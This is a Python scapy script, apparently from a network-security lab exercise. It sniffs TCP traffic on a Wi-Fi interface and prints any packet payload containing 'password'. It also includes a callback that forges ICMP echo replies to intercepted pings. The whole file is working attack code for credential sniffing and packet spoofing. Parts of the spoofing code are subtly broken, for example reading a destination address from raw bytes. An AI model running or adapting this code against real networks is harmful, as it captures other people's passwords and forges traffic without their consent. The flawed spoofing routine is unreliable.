from scapy.all import *
from scapy.layers.inet import TCP, IP, ICMP, UDP
from scapy.layers.l2 import Ether


def in_checksum(packet):
    """Calculate the checksum of a packet"""
    if len(packet) % 2 == 1:
        packet += b'\0'
    sum_ = 0
    for i in range(0, len(packet), 2):
        sum_ += (packet[i] << 8) + packet[i + 1]
    sum_ = (sum_ & 0xffff) + (sum_ >> 16)
    sum_ = (~sum_) & 0xffff
    return sum_


def send_raw_ip_packet(ip):
    """Send a raw IP packet"""
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.sendto(ip, (str(ip.dst), 0))


def print_raw_packet(packet, keyword):
    if packet.haslayer(Raw):
        raw_data = packet[Raw].load
        try:
            decoded_data = raw_data.decode('utf-8')
            if keyword in decoded_data:
                # Highlight the keyword in the printed output
                highlighted_data = decoded_data.replace(keyword, '\033[1;31m{}\033[0m'.format(keyword))
                print("Raw Data:", highlighted_data)
        except UnicodeDecodeError:
            # Handle decoding errors silently
            pass


def got_packet(packet):
    """Callback function for captured packets"""
    if packet.haslayer(Ether) and packet[Ether].type == 0x0800:  # IP type
        ip = packet[IP]

        if ip.haslayer(ICMP):
            icmp = ip[ICMP]
            print("   Protocol: ICMP")

            if icmp.type == 8:  # ICMP Echo Request (ping)
                # Step 1: Copy the original packet
                new_ip = ip.copy()
                new_icmp = icmp.copy()

                # Step 2: Construct the ICMP payload
                payload = b"This is a spoofed reply!\n"

                # Step 3: Modify the ICMP header
                new_icmp.type = 0  # ICMP Echo Reply
                new_icmp.chksum = 0
                new_icmp.payload = payload

                # Step 4: Modify the IP header
                new_ip.src, new_ip.dst = ip.dst, ip.src
                new_ip.ttl = 118
                new_ip.len = len(new_ip) + len(new_icmp) + len(payload)

                # Step 5: Recalculate checksums
                new_icmp.chksum = in_checksum(bytes(new_icmp))
                new_ip.chksum = in_checksum(bytes(new_ip))

                # Step 6: Send the spoofed IP packet
                send_raw_ip_packet(bytes(new_ip))

                return
        elif ip.haslayer(TCP):
            print_raw_packet(packet, "password")
        elif ip.haslayer(UDP):
            print("   Protocol: UDP")
        else:
            print("   Protocol: Others")


# Set the network interface for capturing packets (change it to match your interface)
interface = "Wi-Fi"

# Set the filter expression for capturing packets
filter_exp = "tcp"

# Set the keyword to filter for in the Raw layer data
keyword = "password"

# Capture packets
sniff(iface=interface, filter=filter_exp, prn=lambda packet: print_raw_packet(packet, keyword))
